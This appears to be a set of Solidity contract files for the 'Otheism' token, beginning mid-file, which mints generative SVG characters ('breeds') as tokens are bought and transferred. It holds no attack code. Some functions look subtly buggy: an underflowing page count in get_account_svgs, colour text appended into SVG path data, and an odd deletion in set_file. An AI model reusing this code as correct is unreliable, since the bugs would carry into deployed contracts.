        if (holders_count == 0) return;

        uint removingIndex = _holder_index[value];
        if (removingIndex != holders_count - 1) {
            address lastHolder = _holders[holders_count - 1];
            _holders[removingIndex] = lastHolder;
            _holder_index[lastHolder] = removingIndex;
        }

        --holders_count;
        delete _holder_index[value];
        delete _holders[holders_count];
    }
}

contract Otheism is Token, ReentrancyGuard, HoldersList {
    uint constant MAX_GENS_START = 1000;
    uint public constant GEN_MIN = 1;
    uint public constant gen_max = MAX_GENS_START;
    uint public gen = MAX_GENS_START;
    uint public constant max_breed = 1000;
    mapping(address owner => mapping(uint index => Breed)) public breeds;
    mapping(address owner => uint) public counts;
    uint public breed_total_count;
    uint breed_id;

    constructor() Token("Otheism", "O") {}

    function _add_breed_to_owner(address account, Breed memory breed) private {
        if (account == _pair) return;
        if (++counts[account] == 1) add_holder(account);
        ++breed_total_count;
        uint index = counts[account] - 1;
        breeds[account][index] = breed;
    }

    function _remove_breed_from_owner_by_index(
        address account,
        uint index
    ) private {
        if (account == _pair) return;
        if (--counts[account] == 0) remove_holder(account);
        --breed_total_count;
        uint last_index = counts[account];
        if (index != last_index) {
            Breed memory last_breed = breeds[account][last_index];
            breeds[account][index] = last_breed;
        }
        delete breeds[account][last_index];
    }

    function _transfer_breed_from_to_by_index(
        address account,
        uint index,
        address to
    ) private {
        Breed memory breed = breeds[account][index];
        super.transfer_internal(account, to, 10 ** DECIMALS);
        _remove_breed_from_owner_by_index(account, index);
        _add_breed_to_owner(to, breed);
    }

    function transfer_breed_from_to_by_index(uint index, address to) external {
        require(index < counts[msg.sender], "incorrect index");
        _transfer_breed_from_to_by_index(msg.sender, index, to);
    }

    function gen_mode(uint value) private returns (uint) {
        value = (value * gen) / gen_max;
        if (value == 0) value = 1;
        if (gen > GEN_MIN) --gen;
        return value;
    }

    function buy(
        address to,
        uint256 amount
    ) internal virtual override nonReentrant {
        uint last_balance = balanceOf(to);
        uint balance = last_balance + amount;
        uint count = balance /
            (10 ** decimals()) -
            last_balance /
            (10 ** decimals());
        uint i;
        for (i = 0; i < count; ++i) {
            Breed memory breed = Breed(++breed_id, gen_mode(max_breed));
            _add_breed_to_owner(to, breed);
        }
        super.buy(to, amount);
    }

    function sell(
        address from,
        uint256 amount
    ) internal virtual override lockFee nonReentrant {
        uint last_balance = balanceOf(from);
        uint balance = last_balance - amount;
        uint count = last_balance /
            (10 ** decimals()) -
            balance /
            (10 ** decimals());
        uint i;
        uint owner_count = counts[from];
        for (i = 0; i < count; ++i) {
            if (gen < gen_max) ++gen;
            if (owner_count > 0)
                _remove_breed_from_owner_by_index(from, --owner_count);
        }
        super._transfer(from, _pair, amount);
    }

    function transfer_internal(
        address from,
        address to,
        uint256 amount
    ) internal virtual override nonReentrant {
        uint last_balance_from = balanceOf(from);
        uint balance_from = last_balance_from - amount;
        uint last_balance_to = balanceOf(to);
        uint balance_to = last_balance_to + amount;
        if (to == address(0) || to == DEAD_ADDRESS) {
            last_balance_to = 0;
            balance_to = 0;
        }

        uint count_from = last_balance_from /
            (10 ** decimals()) -
            balance_from /
            (10 ** decimals());
        uint count_to = balance_to /
            (10 ** decimals()) -
            last_balance_to /
            (10 ** decimals());
        // calculate transfer count
        uint transfer_count = count_from;

        if (transfer_count > count_to) transfer_count = count_to;
        // transfer
        uint i;
        uint owner_count = counts[from];
        for (i = 0; i < transfer_count; ++i) {
            if (owner_count == 0) break;
            uint from_index = --owner_count;
            Breed memory breed = breeds[from][from_index];
            _remove_breed_from_owner_by_index(from, from_index);
            _add_breed_to_owner(to, breed);
        }
        uint transfered = i;

        // remove from
        for (i = transfer_count; i < count_from; ++i) {
            uint from_index = --owner_count;
            _remove_breed_from_owner_by_index(from, from_index);
        }

        // generate to
        for (i = transfered; i < count_to; ++i) {
            Breed memory breed = Breed(++breed_id, gen_mode(max_breed));
            _add_breed_to_owner(to, breed);
        }

        super.transfer_internal(from, to, amount);
    }

    function get_item_acc_index(
        address account,
        uint index
    ) external view returns (ItemData memory) {
        return this.get_item(breeds[account][index]);
    }

    function get_svg_acc_index(
        address account,
        uint index
    ) external view returns (string memory) {
        return toSvg(this.get_item_acc_index(account, index));
    }

    function get_account_breeds(
        address account,
        uint index,
        uint count
    ) external view returns (uint page_count, Breed[] memory accounts) {
        uint account_count = counts[account];
        if (index >= account_count) return (0, new Breed[](0));

        uint end = index + count;
        if (end > account_count) {
            end = account_count;
        }
        page_count = end - index;

        accounts = new Breed[](page_count);
        uint i;
        for (i = 0; i < page_count; ++i) {
            accounts[i] = breeds[account][index + i];
        }
    }

    function get_account_items(
        address account,
        uint index,
        uint count
    ) external view returns (uint page_count, ItemData[] memory accounts) {
        uint account_count = counts[account];
        if (index >= account_count) return (0, new ItemData[](0));

        uint end = index + count;
        if (end > account_count) {
            end = account_count;
        }
        page_count = end - index;

        accounts = new ItemData[](page_count);
        uint i;
        for (i = 0; i < page_count; ++i) {
            accounts[i] = this.get_item(breeds[account][index + i]);
        }
    }

    function get_account_svgs(
        address account,
        uint index,
        uint count
    ) external view returns (uint page_count, string[] memory accounts) {
        uint account_count = counts[account];
        if (index >= account_count) return (0, new string[](0));

        uint end = index + count;
        if (end > account_count) {
            end = account_count;
            page_count = index - end;
        }

        accounts = new string[](page_count);
        uint i;
        uint n = 0;
        for (i = index; i < end; ++i) {
            accounts[n++] = toSvg(this.get_item(breeds[account][i]));
        }
    }
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./ERC20Token.sol";
import "./generator/Generator.sol";

address constant DEAD_ADDRESS = 0x000000000000000000000000000000000000dEaD;

contract Token is ERC20Token, Generator {
    uint8 constant DECIMALS = 9;

    uint256 constant _startTotalSupply = 1000 * (10 ** DECIMALS);
    uint256 constant _startMaxBuyCount = (_startTotalSupply * 5) / 10000;
    uint256 constant _addMaxBuyPercentPerSec = 1; // 100%=_addMaxBuyPrecesion add 0.005%/second
    uint256 constant _addMaxBuyPrecesion = 10000;
    uint256 constant _taxPrecesion = 1000;
    uint256 constant _transferZeroTaxSeconds = 1000; // zero tax transfer time
    address internal _pair;
    address immutable _deployer;
    bool internal _feeLocked;
    uint256 internal _startTime;

    constructor(
        string memory name_,
        string memory symbol_
    ) ERC20Token(name_, symbol_) {
        _deployer = msg.sender;
        _mint(msg.sender, _startTotalSupply);
    }

    modifier maxBuyLimit(uint256 amount) {
        require(amount <= maxBuy(), "max buy");
        _;
    }
    modifier lockFee() {
        _feeLocked = true;
        _;
        _feeLocked = false;
    }

    function decimals() public pure override returns (uint8) {
        return DECIMALS;
    }

    function start(address pair) external onlyOwner {
        _pair = pair;
        _startTime = block.timestamp;
    }

    function isStarted() public view returns (bool) {
        return _pair != address(0);
    }

    receive() external payable {
        bool sent;
        (sent, ) = payable(_deployer).call{value: msg.value}("");
        require(sent, "can not get ether");
    }

    function maxBuy() public view returns (uint256) {
        if (!isStarted()) return _startTotalSupply;
        uint256 count = _startMaxBuyCount +
            (_startTotalSupply *
                (block.timestamp - _startTime) *
                _addMaxBuyPercentPerSec) /
            _addMaxBuyPrecesion;
        if (count > _startTotalSupply) count = _startTotalSupply;
        return count;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        // allow burning
        if (to == address(0) || to == DEAD_ADDRESS) {
            transfer_internal(from, to, amount);
            return;
        }

        // system transfers
        if (
            !isStarted() &&
            (from == address(0) ||
                from == address(this) ||
                from == _deployer ||
                to == _deployer)
        ) {
            super._transfer(from, to, amount);
            return;
        }

        // transfers with fee
        if (_feeLocked) {
            super._transfer(from, to, amount);
            return;
        } else {
            if (from == _pair) {
                buy(to, amount);
                return;
            } else if (to == _pair) {
                sell(from, amount);
                return;
            } else transfer_internal(from, to, amount);
        }
    }

    function buy(
        address to,
        uint256 amount
    ) internal virtual maxBuyLimit(amount) lockFee {
        super._transfer(_pair, to, amount);
    }

    function sell(address from, uint256 amount) internal virtual lockFee {
        super._transfer(from, _pair, amount);
    }

    function transfer_internal(
        address from,
        address to,
        uint256 amount
    ) internal virtual lockFee {
        if (to == address(0) || to == DEAD_ADDRESS) {
            _burn(from, amount);
            return;
        }
        super._transfer(from, to, amount);
    }
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

library ColorConvert {
    function toSvgColor(uint24 value) internal pure returns (string memory) {
        return string(abi.encodePacked("#", toHex(value)));
    }

    function toHex(uint24 value) internal pure returns (bytes memory) {
        bytes memory buffer = new bytes(6);
        for (uint i = 0; i < 3; ++i) {
            buffer[5 - i * 2] = hexChar(uint8(value) & 0x0f);
            buffer[4 - i * 2] = hexChar((uint8(value) >> 4) & 0x0f);
            value >>= 8;
        }
        return buffer;
    }

    function hexChar(uint8 value) internal pure returns (bytes1) {
        if (value < 10) return bytes1(uint8(48 + (uint(value) % 10)));
        return bytes1(uint8(65 + uint256((value - 10) % 6)));
    }
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import './Path.sol';

struct FileData {
    uint file;
    Path[] paths;
}

library FilesLib {
    function set_file(
        mapping(uint => Path[]) storage paths,
        FileData calldata input,
        uint8 count
    ) internal returns (uint8) {
        Path[] storage storageFile = paths[input.file];
        if (storageFile.length > 0) delete paths[input.file - 1];
        else ++count;
        for (uint i = 0; i < input.paths.length; ++i) {
            storageFile.push(input.paths[i]);
        }
        return count;
    }

    function set_files(
        mapping(uint => Path[]) storage paths,
        FileData[] calldata input,
        uint8 count
    ) internal returns (uint8) {
        if (input.length == 0) return count;
        uint i;
        for (i = 0; i < input.length; ++i)
            count = set_file(paths, input[i], count);
        return count;
    }
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import "./Path.sol";
import "./String.sol";
import "./Files.sol";
import "./Colors.sol";
import "./IGenerator.sol";
import "../Breed.sol";
import "./Random.sol";
import "lib/openzeppelin-contracts/contracts/access/Ownable.sol";

uint8 constant PIXELS_COUNT = 10;

contract Generator is Ownable(msg.sender) {
    using FilesLib for mapping(uint => Path[]);
    using PathLib for Path;
    using PathLib for Path[];
    using RandLib for Rand;
    using RandLib for string[];

    string[] public background_colors = [
        "#ff5733",  // Red-Orange
        "#33c1ff",  // Light Blue
        "#ffcc33",  // Golden Yellow
        "#33ff57",  // Light Green
        "#8c33ff",  // Purple
        "#ff33b5",  // Pink
        "#33ffcc",  // Aqua
        "#ff3384",  // Deep Pink
        "#33d1ff",  // Cyan
        "#ffb833"   // Orange
    ];

    string[] public body_colors = [
        "#ffe6cc",  // Light Peach
        "#ffcc99",  // Soft Orange
        "#ffd1dc",  // Light Pink
        "#f0e68c",  // Khaki
        "#fff5ee",  // Seashell White
        "#e0e0e0",  // Light Gray
        "#b0e57c",  // Soft Green
        "#fa8072",  // Salmon
        "#ffdd99",  // Pale Orange
        "#fffafa"   // Snow White
    ];


    string[] public mouth_colors = [
        "#e9967a",  // Dark Salmon
        "#ff6347",  // Tomato Red
        "#ffa07a",  // Light Salmon
        "#cd5c5c",  // Indian Red
        "#f5deb3",  // Wheat
        "#696969",  // Dim Gray
        "#98fb98",  // Pale Green
        "#ff4500",  // Orange Red
        "#d2b48c",  // Tan
        "#ffefd5"   // Papaya Whip
    ];

    string[] public nose_colors = [
        "#8b4513",  // Saddle Brown
        "#a0522d",  // Sienna
        "#d2691e",  // Chocolate
        "#cd853f",  // Peru
        "#bdb76b",  // Dark Khaki
        "#696969",  // Dim Gray
        "#808000",  // Olive
        "#ff6347",  // Tomato
        "#8b0000",  // Dark Red
        "#d2b48c"   // Tan
    ];

    string[] public shirt_1_colors = [
        "#f0f8ff",  // Alice Blue
        "#4682b4",  // Steel Blue
        "#ffe4e1",  // Misty Rose
        "#ffdead",  // Navajo White
        "#e6e6fa",  // Lavender
        "#808080",  // Gray
        "#fafad2",  // Light Goldenrod Yellow
        "#ff7f50",  // Coral
        "#fff8dc",  // Cornsilk
        "#c0c0c0"   // Silver
    ];

    string[] public shirt_2_colors = [
        "#ff69b4",  // Hot Pink
        "#b22222",  // Firebrick
        "#fdfd96",  // Pastel Yellow
        "#dda0dd",  // Plum
        "#ffb6c1",  // Light Pink
        "#ff4500",  // Orange Red
        "#8a2be2",  // Blue Violet
        "#dda0dd",  // Plum
        "#98fb98",  // Pale Green
        "#ffd700"   // Gold
    ];

    string[] public shirt_3_colors = [
        "#800080",  // Purple
        "#5f9ea0",  // Cadet Blue
        "#ff6347",  // Tomato
        "#4b0082",  // Indigo
        "#800000",  // Maroon
        "#ff4500",  // Orange Red
        "#2f4f4f",  // Dark Slate Gray
        "#808000",  // Olive
        "#8b0000",  // Dark Red
        "#d2691e"   // Chocolate
    ];

    string[] public eyes_colors = [
        "#87ceeb",  // Sky Blue
        "#fffacd",  // Lemon Chiffon
        "#98fb98",  // Pale Green
        "#dda0dd",  // Plum
        "#ff69b4",  // Hot Pink
        "#faebd7",  // Antique White
        "#f08080",  // Light Coral
        "#afeeee",  // Pale Turquoise
        "#f5f5f5",  // White Smoke
        "#ffdab9"   // Peach Puff
    ];

    string[] public hair_colors = [
        "#d2691e",  // Chocolate
        "#8b4513",  // Saddle Brown
        "#deb887",  // Burly Wood
        "#ff6347",  // Tomato
        "#daa520",  // Goldenrod
        "#e9967a",  // Dark Salmon
        "#cd853f",  // Peru
        "#8b0000",  // Dark Red
        "#ffa07a",  // Light Salmon
        "#b8860b"   // Dark Goldenrod
    ];

    string[] public accessories_colors = [
        "#dcdcdc",  // Gainsboro
        "#4682b4",  // Steel Blue
        "#32cd32",  // Lime Green
        "#ff69b4",  // Hot Pink
        "#ff4500",  // Orange Red
        "#00fa9a",  // Medium Spring Green
        "#ff6347",  // Tomato
        "#ffa500",  // Orange
        "#87cefa",  // Light Sky Blue
        "#9370db"   // Medium Purple
    ];

    string[] public facial_hair_colors = [
        "#8b4513",  // Saddle Brown
        "#a0522d",  // Sienna
        "#d2691e",  // Chocolate
        "#cd853f",  // Peru
        "#808080",  // Gray
        "#8b0000",  // Dark Red
        "#b8860b",  // Dark Goldenrod
        "#696969",  // Dim Gray
        "#daa520",  // Goldenrod
        "#ff8c00"   // Dark Orange
    ];

    string[] public eyes_base_colors = [
        "#000000",  // Black
        "#ff6347",  // Tomato
        "#1e90ff",  // Dodger Blue
        "#32cd32",  // Lime Green
        "#ff4500",  // Orange Red
        "#ffd700",  // Gold
        "#8a2be2",  // Blue Violet
        "#ff1493",  // Deep Pink
        "#00ced1",  // Dark Turquoise
        "#ff69b4"   // Hot Pink
    ];

    string[] public hat_colors = [
        "#d2691e",  // Chocolate
        "#ff4500",  // Orange Red
        "#2e8b57",  // Sea Green
        "#4682b4",  // Steel Blue
        "#ff6347",  // Tomato
        "#ff1493",  // Deep Pink
        "#8b0000",  // Dark Red
        "#dda0dd",  // Plum
        "#ffd700",  // Gold
        "#8a2be2"   // Blue Violet
    ];

    string[] public mask_colors = [
        "#ffffff",  // White
        "#f4a460",  // Sandy Brown
        "#ff6347",  // Tomato
        "#b22222",  // Firebrick
        "#ff4500",  // Orange Red
        "#8b4513",  // Saddle Brown
        "#bc8f8f",  // Rosy Brown
        "#ff6347",  // Tomato
        "#fffaf0",  // Floral White
        "#8a2be2"   // Blue Violet
    ];

    mapping(uint => Path[]) body;
    mapping(uint => Path[]) facial_hair;
    mapping(uint => Path[]) shirt_1;
    mapping(uint => Path[]) shirt_2;
    mapping(uint => Path[]) shirt_3;
    mapping(uint => Path[]) nose;
    mapping(uint => Path[]) mouth;
    mapping(uint => Path[]) eyes_base;
    mapping(uint => Path[]) eyes;
    mapping(uint => Path[]) hair;
    mapping(uint => Path[]) hat;
    mapping(uint => Path[]) accessories;
    mapping(uint => Path[]) mask;

    uint8 body_count;
    uint8 facial_hair_count;
    uint8 shirt_1_count;
    uint8 shirt_2_count;
    uint8 shirt_3_count;
    uint8 nose_count;
    uint8 mouth_count;
    uint8 eyes_base_count;
    uint8 eyes_count;
    uint8 hair_count;
    uint8 hat_count;
    uint8 accessories_count;
    uint8 mask_count;
    uint color_step_base = 1000;
    uint MAX = 1000;

    function set_max_base(uint max) external onlyOwner {
        MAX = max;
    }

    function set_color_step_base(uint step_base) external onlyOwner {
        color_step_base = step_base;
    }

    function pick_0(uint count, uint random) internal pure returns (uint) {
        return random % count;
    }

    function pick_1(uint count, uint random) internal pure returns (uint) {
        return (random % count) + 1;
    }

    function get_step(uint breed2) internal view returns (uint) {
        if (breed2 < color_step_base) return color_step_base - breed2;
        return 1;
    }

    function pick_progressive(
        uint count,
        uint random
    ) internal pure returns (uint) {
        uint s = ((1 + count) * count) / 2;
        random %= s;
        uint sum;
        uint i;
        for (i = 0; i < count; ++i) {
            sum += i + 1;
            if (sum >= random) return count - i - 1;
        }
        return 0;
    }

    function pick_color_internal(
        uint count,
        uint random_value,
        uint step
    ) public pure returns (uint) {
        uint sum = 0;
        uint i;
        for (i = 0; i < count; ++i) sum += i * step + step;
        random_value = random_value % sum;
        sum = 0;
        for (i = 0; i < count; ++i) {
            sum += i * step + step;
            if (sum >= random_value) return i;
        }
        return 0;
    }

    function pick_color(
        string[] storage colors,
        uint random_value,
        uint step
    ) private view returns (uint) {
        return pick_color_internal(colors.length, random_value, step);
    }

    function set_body(FileData[] calldata data) external onlyOwner {
        body_count = body.set_files(data, body_count);
    }

    function set_facial_hair(FileData[] calldata data) external onlyOwner {
        facial_hair_count = facial_hair.set_files(data, facial_hair_count);
    }

    function set_shirt_1(FileData[] calldata data) external onlyOwner {
        shirt_1_count = shirt_1.set_files(data, shirt_1_count);
    }

    function set_shirt_2(FileData[] calldata data) external onlyOwner {
        shirt_2_count = shirt_2.set_files(data, shirt_2_count);
    }

    function set_shirt_3(FileData[] calldata data) external onlyOwner {
        shirt_3_count = shirt_3.set_files(data, shirt_3_count);
    }

    function set_nose(FileData[] calldata data) external onlyOwner {
        nose_count = nose.set_files(data, nose_count);
    }

    function set_mouth(FileData[] calldata data) external onlyOwner {
        mouth_count = mouth.set_files(data, mouth_count);
    }

    function set_eyes(FileData[] calldata data) external onlyOwner {
        eyes_count = eyes.set_files(data, eyes_count);
    }

    function set_eyes_base(FileData[] calldata data) external onlyOwner {
        eyes_base_count = eyes_base.set_files(data, eyes_base_count);
    }

    function set_hair(FileData[] calldata data) external onlyOwner {
        hair_count = hair.set_files(data, hair_count);
    }

    function set_hat(FileData[] calldata data) external onlyOwner {
        hat_count = hat.set_files(data, hat_count);
    }

    function set_accessories(FileData[] calldata data) external onlyOwner {
        accessories_count = accessories.set_files(data, accessories_count);
    }

    function set_mask(FileData[] calldata data) external onlyOwner {
        mask_count = mask.set_files(data, mask_count);
    }

    function get_item(
        Breed calldata breed
    ) external view returns (ItemData memory) {
        Rand memory rnd = Rand(breed, 0);

        ItemData memory data;
        data.background_color = rnd.next() % background_colors.length;
        data.body = pick_1(body_count, rnd.next());
        data.body_color = pick_color(
            body_colors,
            rnd.next(),
            get_step(rnd.breed.breed2)
        );
        if (rnd.next_breed2_clamped() > (MAX / 3)) {
            data.facial_hair = pick_1(facial_hair_count, rnd.next());
            data.facial_hair_color = pick_color(
                facial_hair_colors,
                rnd.next(),
                get_step(rnd.breed.breed2)
            );
        }
        data.shirt_1 = pick_1(shirt_1_count, rnd.next());
        data.shirt_1_color = rnd.next() % shirt_1_colors.length;
        if (rnd.next_breed2_clamped() > (MAX / 3)) {
            data.shirt_2 = pick_1(shirt_2_count, rnd.next());
            data.shirt_2_color = pick_color(
                shirt_2_colors,
                rnd.next(),
                get_step(rnd.breed.breed2)
            );
        }
        if (rnd.next_breed2_clamped() > (MAX / 3)) {
            data.shirt_3 = pick_1(shirt_3_count, rnd.next());
            data.shirt_3_color = pick_color(
                shirt_3_colors,
                rnd.next(),
                get_step(rnd.breed.breed2)
            );
        }
        if (rnd.next_breed2_clamped() > (MAX / 3)) {
            data.nose = pick_1(nose_count, rnd.next());
            data.nose_color = pick_color(
                nose_colors,
                rnd.next(),
                get_step(rnd.breed.breed2)
            );
        }
        if (rnd.next_breed2_clamped() > (MAX / 3)) {
            data.mouth = pick_1(mouth_count, rnd.next());
            data.mouth_color = pick_color(
                mouth_colors,
                rnd.next(),
                get_step(rnd.breed.breed2)
            );
        }
        data.eyes_base_color = pick_color(
            eyes_base_colors,
            rnd.next(),
            get_step(rnd.breed.breed2)
        );
        data.eyes = pick_1(eyes_count, rnd.next());
        data.eyes_color = pick_color(
            eyes_colors,
            rnd.next(),
            get_step(rnd.breed.breed2)
        );
        if (rnd.next_breed2_clamped() > (MAX / 3)) {
            data.hair = pick_1(hair_count, rnd.next());
            data.hair_color = pick_color(
                hair_colors,
                rnd.next(),
                get_step(rnd.breed.breed2)
            );
        }
        if (rnd.next_breed2_clamped() > (MAX / 3)) {
            data.hat = pick_1(hat_count, rnd.next());
            data.hat_color = pick_color(
                hat_colors,
                rnd.next(),
                get_step(rnd.breed.breed2)
            );
        }
        if (rnd.next_breed2_clamped() > (MAX / 3)) {
            data.accessories = pick_1(accessories_count, rnd.next());
            data.accessories_color = pick_color(
                accessories_colors,
                rnd.next(),
                get_step(rnd.breed.breed2)
            );
        }
        if (rnd.next_breed2_clamped() > (MAX / 3)) {
            data.mask = pick_1(mask_count, rnd.next());
            data.mask_color = pick_color(
                mask_colors,
                rnd.next(),
                get_step(rnd.breed.breed2)
            );
        }

        return data;
    }

    function getSvg(
        Breed calldata breed
    ) external view returns (string memory) {
        return toSvg(this.get_item(breed));
    }

    function toSvg(ItemData memory data) internal view returns (string memory) {
        bytes memory svgStart = abi.encodePacked(
            "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0",
            " ",
            StringConverter.toString(PIXELS_COUNT),
            " ",
            StringConverter.toString(PIXELS_COUNT),
            "'>"
        );

        bytes memory b1 = abi.encodePacked(
            svgStart,
            abi.encodePacked(
                "<rect x='0' y='0'",
                " width='",
                StringConverter.toString(PIXELS_COUNT),
                "' height='",
                StringConverter.toString(PIXELS_COUNT),
                "' fill='",
                background_colors[data.background_color],
                "'/>"
            ),
            toSvg(body, body_colors, data.body, data.body_color),
            toSvg(shirt_1, shirt_1_colors, data.shirt_1, data.shirt_1_color),
            toSvg(
                facial_hair,
                facial_hair_colors,
                data.facial_hair,
                data.facial_hair_color
            ),
            toSvg(shirt_2, shirt_2_colors, data.shirt_2, data.shirt_2_color),
            toSvg(shirt_3, shirt_3_colors, data.shirt_3, data.shirt_3_color),
            toSvg(nose, nose_colors, data.nose, data.nose_color),
            toSvg(mouth, mouth_colors, data.mouth, data.mouth_color)
        );
        bytes memory b2 = abi.encodePacked(
            toSvg(eyes_base, eyes_base_colors, 1, data.eyes_base_color),
            toSvg(eyes, eyes_colors, data.eyes, data.eyes_color),
            toSvg(hair, hair_colors, data.hair, data.hair_color),
            toSvg(hat, hat_colors, data.hat, data.hat_color),
            toSvg(mask, mask_colors, data.mask, data.mask_color),
            toSvg_accessory(
                accessories,
                accessories_colors,
                data.accessories,
                data.accessories_color
            )
        );

        return string(abi.encodePacked(b1, b2, "</svg>"));
    }

    function toSvg(
        mapping(uint => Path[]) storage paths,
        string[] storage colors,
        uint item_id,
        uint color_index
    ) private view returns (string memory) {
        if (item_id == 0) return "";
        return paths[item_id - 1].toSvg(colors[color_index]);
    }

    function toSvg_accessory(
        mapping(uint => Path[]) storage paths,
        string[] storage colors,
        uint item_id,
        uint color_index
    ) private view returns (string memory) {
        if (item_id == 0) return "";
        if (item_id == 1) return paths[item_id - 1].toSvg();
        return paths[item_id - 1].toSvg(colors[color_index]);
    }
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "../Breed.sol";
import "./ItemData.sol";

interface IGenerator {
    function get_item(
        Breed calldata seed_data
    ) external view returns (ItemData memory);

    function getSvg(
        Breed calldata seed_data
    ) external view returns (string memory);
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

struct ItemData {
    uint background_color;
    uint body;
    uint body_color;
    uint facial_hair;
    uint facial_hair_color;
    uint shirt_1;
    uint shirt_1_color;
    uint shirt_2;
    uint shirt_2_color;
    uint shirt_3;
    uint shirt_3_color;
    uint nose;
    uint nose_color;
    uint mouth;
    uint mouth_color;
    uint eyes_base_color;
    uint eyes;
    uint eyes_color;
    uint hair;
    uint hair_color;
    uint hat;
    uint hat_color;
    uint accessories;
    uint accessories_color;
    uint mask;
    uint mask_color;
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import "./Path.sol";
import "./String.sol";
import "./Colors.sol";
import "./Random.sol";

struct Path {
    string fill;
    string data;
}

library PathLib {
    using PathLib for Path;
    using RandLib for Rand;
    using RandLib for string[];
    using StringConverter for uint8;
    using ColorConvert for uint24;
    using StringLib for string;

    function toSvg(Path memory p) internal pure returns (string memory) {
        return
            string(
                abi.encodePacked("<path fill='", p.fill, "' d='", p.data, "'/>")
            );
    }

    function toSvg(
        Path memory p,
        string memory color
    ) internal pure returns (string memory) {
        return
            string(
                abi.encodePacked(
                    "<path fill='",
                    color,
                    "' d='",
                    p.data,
                    color,
                    "'/>"
                )
            );
    }

    function toSvg(
        Path[] storage paths,
        string memory color
    ) internal view returns (string memory) {
        string memory res;
        for (uint i = 0; i < paths.length; ++i) {
            res = string(abi.encodePacked(res, paths[i].toSvg(color)));
        }
        return res;
    }

    function toSvg(Path[] storage paths) internal view returns (string memory) {
        string memory res;
        for (uint i = 0; i < paths.length; ++i) {
            res = string(abi.encodePacked(res, paths[i].toSvg()));
        }
        return res;
    }
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import "../Breed.sol";

struct Rand {
    Breed breed;
    uint nonce;
}

library RandLib {
    function next(Rand memory rnd) internal pure returns (uint) {
        return
            uint(
                keccak256(
                    abi.encodePacked(
                        rnd.breed.serial_number,
                        rnd.breed.breed2,
                        rnd.nonce++
                    )
                )
            );
    }

    function next_breed2_clamped(Rand memory rnd) internal pure returns (uint) {
        return next(rnd) % rnd.breed.breed2;
    }
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

library StringLib {
    function equals(
        string memory s1,
        string memory s2
    ) internal pure returns (bool) {
        return (keccak256(abi.encodePacked((s1))) ==
            keccak256(abi.encodePacked((s2))));
    }
}

library StringConverter {
    function toString(uint value) internal pure returns (string memory) {
        if (value == 0) {
            return "0";
        }
        uint temp = value;
        uint digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }
}